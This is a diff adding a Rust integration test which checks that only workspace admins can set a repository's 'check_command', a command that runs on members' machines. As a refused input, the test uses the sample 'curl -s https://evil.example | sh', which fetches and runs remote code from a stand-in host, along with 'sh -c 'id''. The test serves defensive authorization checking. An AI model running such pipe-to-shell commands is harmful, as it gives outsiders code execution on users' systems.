@@ -439,6 +439,71 @@ async fn null_clears_a_repositorys_settings(pool: PgPool) {
 }
 
 #[sqlx::test(migrations = "../../migrations")]
+async fn only_admins_give_a_repository_a_check_command_since_it_runs_on_every_mac(pool: PgPool) {
+    let app = App::new(pool);
+    let (ada, workspace) = app.signup("Ada", "Code Villain").await;
+    let token = app.invite(&ada, &workspace, "member").await;
+    let grace = app.join("Grace", &token).await;
+    let update = |id: Uuid, data: Value| json!([{ "action": "update", "model": "Repository", "id": id, "data": data }]);
+
+    let mut data = repository("github.com/code-villain/api");
+    data["check_command"] = json!("curl -s https://evil.example | sh");
+    let refused = create(&app, &grace, &workspace, "Repository", data).await;
+    assert_eq!(refused.status, StatusCode::FORBIDDEN, "{}", refused.body);
+
+    let id = Uuid::now_v7();
+    let added = app
+        .sync(
+            &grace,
+            &workspace,
+            json!([{ "action": "create", "model": "Repository", "id": id,
+            "data": repository("github.com/code-villain/api") }]),
+        )
+        .await;
+    assert_eq!(added.status, StatusCode::OK, "{}", added.body);
+    let refused = app
+        .sync(
+            &grace,
+            &workspace,
+            update(id, json!({ "check_command": "sh -c 'id'" })),
+        )
+        .await;
+    assert_eq!(refused.status, StatusCode::FORBIDDEN, "{}", refused.body);
+
+    let set = app
+        .sync(
+            &ada,
+            &workspace,
+            update(id, json!({ "check_command": "bun run check" })),
+        )
+        .await;
+    assert_eq!(set.status, StatusCode::OK, "{}", set.body);
+    // The web app's form sends every field: the check, unchanged, is no change.
+    let renamed = app
+        .sync(
+            &grace,
+            &workspace,
+            update(
+                id,
+                json!({ "name": "API", "check_command": "bun run check" }),
+            ),
+        )
+        .await;
+    assert_eq!(renamed.status, StatusCode::OK, "{}", renamed.body);
+    let cleared = app
+        .sync(
+            &grace,
+            &workspace,
+            update(id, json!({ "check_command": null })),
+        )
+        .await;
+    assert_eq!(cleared.status, StatusCode::OK, "{}", cleared.body);
+    let repository = &app.records(&grace, &workspace, "Repository").await[0];
+    assert_eq!(repository["name"], "API");
+    assert_eq!(repository["check_command"], Value::Null);
+}
+
+#[sqlx::test(migrations = "../../migrations")]
 async fn a_repository_keeps_at_most_fifty_notes(pool: PgPool) {
     let app = App::new(pool);
     let (ada, workspace) = app.signup("Ada", "Code Villain").await;
